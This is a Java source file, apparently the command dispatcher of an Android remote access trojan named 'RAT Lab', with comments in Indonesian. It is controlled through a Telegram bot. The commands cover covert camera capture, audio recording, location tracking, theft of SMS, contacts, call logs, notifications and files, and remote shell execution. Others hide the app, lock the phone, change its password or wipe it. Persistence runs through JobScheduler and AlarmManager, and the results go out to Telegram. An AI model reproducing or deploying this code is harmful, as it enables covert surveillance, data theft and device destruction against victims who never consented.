package com.ratlab;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobScheduler;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CommandHandler {

    private static final String TAG = "CommandHandler";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    private static final int JOB_ID = 2001;
    private static final int ALARM_ID = 3001;

    private final Context ctx;
    private final String token;
    private final long ownerId;
    private final OkHttpClient http;
    private long lastUpdateId = 0;
    private boolean paused = false;

    private final CameraModule camera;
    private final LocationModule location;
    private final SmsModule sms;
    private final ContactModule contacts;
    private final FileModule files;
    private final ShellModule shell;
    private final AudioModule audio;
    private final HideModule hide;
    private final DeviceAdminModule admin;

    public CommandHandler(Context ctx, String token, long ownerId) {
        this.ctx = ctx;
        this.token = token;
        this.ownerId = ownerId;
        this.http = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();

        this.camera = new CameraModule(ctx);
        this.location = new LocationModule(ctx);
        this.sms = new SmsModule(ctx);
        this.contacts = new ContactModule(ctx);
        this.files = new FileModule(ctx);
        this.shell = new ShellModule(ctx);
        this.audio = new AudioModule(ctx);
        this.hide = new HideModule(ctx);
        this.admin = new DeviceAdminModule(ctx);
    }

    public void pollUpdates() throws IOException {
        String url = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=10&offset=" + (lastUpdateId + 1);
        Request req = new Request.Builder().url(url).get().build();
        try (Response res = http.newCall(req).execute()) {
            if (!res.isSuccessful() || res.body() == null) return;
            String body = res.body().string();
            JSONObject json = new JSONObject(body);
            JSONArray result = json.optJSONArray("result");
            if (result == null) return;
            for (int i = 0; i < result.length(); i++) {
                JSONObject update = result.getJSONObject(i);
                long updateId = update.getLong("update_id");
                if (updateId > lastUpdateId) lastUpdateId = updateId;
                handleUpdate(update);
            }
        } catch (Exception e) {
            Log.e(TAG, "pollUpdates error: " + e.getMessage());
        }
    }

    private void handleUpdate(JSONObject update) {
        try {
            JSONObject message = update.optJSONObject("message");
            if (message == null) return;
            long fromId = message.optJSONObject("from").optLong("id");
            if (fromId != ownerId) return;

            long chatId = message.optJSONObject("chat").optLong("id");
            String text = message.optString("text", "").trim();
            if (text.isEmpty()) return;

            String cmd = text.split(" ")[0].toLowerCase();
            String args = text.length() > cmd.length() ? text.substring(cmd.length() + 1).trim() : "";

            String response = handleCommand(cmd, args);
            if (response != null && !response.isEmpty()) {
                sendMessage(chatId, response);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleUpdate error: " + e.getMessage());
        }
    }

    private String handleCommand(String cmd, String args) {
        try {
            // Command khusus pause/resume — tetep jalan walau paused
            switch (cmd) {
                case "/stop":
                    return stopRat();
                case "/resume":
                    return resumeRat();
            }

            // Kalau paused, command lain di-skip (kecuali start/help)
            if (paused && !cmd.equals("/start") && !cmd.equals("/help")) {
                return "RAT sedang di-pause. Kirim /resume untuk mengaktifkan.";
            }

            switch (cmd) {
                case "/start":
                case "/help":
                    return "RAT Lab — Commands:\n\n"
                            + "== KONTROL RAT ==\n"
                            + "/stop — hentikan RAT\n"
                            + "/resume — lanjutkan RAT\n\n"
                            + "== INFO ==\n"
                            + "/ping /info /uptime /whoami /env\n\n"
                            + "== KAMERA ==\n"
                            + "/camera /camerafront\n\n"
                            + "== AUDIO ==\n"
                            + "/play <url> /audio-max /speak <detik> /record <detik>\n"
                            + "/tts <teks> /volume <level> /vibrate <ms>\n\n"
                            + "== LOKASI ==\n"
                            + "/location /gps\n\n"
                            + "== SMS & KONTAK ==\n"
                            + "/sms /smsall /contacts /calllog\n"
                            + "/call <nomor> /sendtext <nomor> <pesan>\n\n"
                            + "== FILE & SHELL ==\n"
                            + "/files <path> /shell <cmd> /apps\n"
                            + "/download <url> /upload <path>\n\n"
                            + "== JARINGAN ==\n"
                            + "/wifi /wifiscan /netstat /processes\n\n"
                            + "== KONTROL HP ==\n"
                            + "/torch /brightness <level> /clipboard /notif\n\n"
                            + "== STEALTH ==\n"
                            + "/hide /unhide /restart\n\n"
                            + "== DEVICE ADMIN ==\n"
                            + "/lock [password] /force-lock <menit>\n"
                            + "/change-password <password>\n"
                            + "/disable-camera on|off\n"
                            + "/reset /wipe";

                case "/ping":
                    return "Pong! Bot aktif. Paused: " + paused;

                case "/info":
                    return DeviceInfo.get(ctx);

                case "/camera":
                    return camera.takePicture(false);

                case "/camerafront":
                    return camera.takePicture(true);

                case "/location":
                case "/gps":
                    return location.get();

                case "/sms":
                    return sms.list(5);

                case "/smsall":
                    return sms.list(100);

                case "/contacts":
                    return contacts.list();

                case "/calllog":
                    return contacts.callLog();

                case "/files":
                    return files.list(args.isEmpty() ? "/sdcard" : args);

                case "/shell":
                    if (args.isEmpty()) return "Format: /shell <cmd>";
                    return shell.exec(args);

                case "/apps":
                    return files.listApps();

                case "/torch":
                    return TorchControl.toggle(ctx);

                case "/vibrate":
                    return VibrateControl.vibrate(ctx, args);

                case "/tts":
                    return TtsControl.speak(ctx, args);

                case "/volume":
                    return AudioModule.setVolume(ctx, args);

                case "/brightness":
                    return BrightnessControl.set(ctx, args);

                case "/play":
                    return audio.play(args);

                case "/audio-max":
                    return audio.maxVolume();

                case "/speak":
                case "/record":
                    return audio.record(args);

                case "/wifi":
                    return NetworkInfo.getWifi(ctx);

                case "/wifiscan":
                    return NetworkInfo.scanWifi(ctx);

                case "/processes":
                    return shell.exec("ps -A | head -50");

                case "/netstat":
                    return shell.exec("netstat -tun 2>/dev/null | head -30");

                case "/uptime":
                    return shell.exec("uptime");

                case "/whoami":
                    return shell.exec("id");

                case "/env":
                    return shell.exec("env | head -30");

                case "/clipboard":
                    return shell.exec("termux-clipboard-get 2>/dev/null || echo 'clipboard API gak ada'");

                case "/notif":
                    return shell.exec("dumpsys notification --noredact 2>/dev/null | head -50");

                case "/hide":
                    return hide.hide();

                case "/unhide":
                    return hide.unhide();

                case "/restart":
                    Intent svc = new Intent(ctx, BotService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(svc);
                    } else {
                        ctx.startService(svc);
                    }
                    return "Service direstart.";

                case "/lock":
                    return admin.lock(args);

                case "/force-lock":
                    if (args.isEmpty()) return "Format: /force-lock <menit>";
                    try {
                        return admin.forceLock(Integer.parseInt(args));
                    } catch (Exception e) {
                        return "Format salah. Pakai angka: /force-lock 5";
                    }

                case "/change-password":
                    if (args.isEmpty()) return "Format: /change-password <password>";
                    return admin.changePassword(args);

                case "/disable-camera":
                    if (args.equals("on")) return admin.disableCamera(true);
                    if (args.equals("off")) return admin.disableCamera(false);
                    return "Format: /disable-camera on|off";

                case "/reset":
                case "/wipe":
                    return admin.reset("");

                default:
                    return null;
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // ============================================================
    // STOP RAT — matiin service + persistence
    // ============================================================
    private String stopRat() {
        try {
            paused = true;

            // 1. Matiin JobScheduler
            try {
                JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                if (js != null) js.cancelAll();
            } catch (Exception e) {}

            // 2. Matiin AlarmManager
            try {
                AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                Intent ai = new Intent(ctx, AlarmReceiver.class);
                PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_ID, ai,
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                if (am != null) am.cancel(pi);
            } catch (Exception e) {}

            // 3. Stop foreground service (tapi tetep polling command)
            //    Service tetep hidup biar bisa terima /resume
            return "RAT di-PAUSE.\n"
                    + "- JobScheduler: OFF\n"
                    + "- AlarmManager: OFF\n"
                    + "- Command lain di-skip\n\n"
                    + "Kirim /resume untuk lanjut.";
        } catch (Exception e) {
            return "Error stop: " + e.getMessage();
        }
    }

    // ============================================================
    // RESUME RAT — nyalain service + persistence
    // ============================================================
    private String resumeRat() {
        try {
            paused = false;

            // 1. Restart service (kalau mati)
            Intent svc = new Intent(ctx, BotService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }

            // 2. Nyalain JobScheduler
            try {
                JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                android.app.job.JobInfo job = new android.app.job.JobInfo.Builder(
                        JOB_ID, new android.content.ComponentName(ctx, RestartJobService.class))
                        .setPersisted(true)
                        .setPeriodic(15 * 60 * 1000L)
                        .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                        .build();
                if (js != null) js.schedule(job);
            } catch (Exception e) {}

            // 3. Nyalain AlarmManager
            try {
                AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                Intent ai = new Intent(ctx, AlarmReceiver.class);
                PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_ID, ai,
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                if (am != null) {
                    am.setRepeating(AlarmManager.RTC_WAKEUP,
                            System.currentTimeMillis() + 60_000L,
                            60_000L,
                            pi);
                }
            } catch (Exception e) {}

            return "RAT di-RESUME.\n"
                    + "- Service: ON\n"
                    + "- JobScheduler: ON\n"
                    + "- AlarmManager: ON\n\n"
                    + "Semua command aktif lagi.";
        } catch (Exception e) {
            return "Error resume: " + e.getMessage();
        }
    }

    private void sendMessage(long chatId, String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", text.length() > 4000 ? text.substring(0, 4000) : text);

            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendMessage")
                    .post(RequestBody.create(body.toString(), JSON))
                    .build();
            http.newCall(req).execute().close();
        } catch (Exception e) {
            Log.e(TAG, "sendMessage error: " + e.getMessage());
        }
    }
}
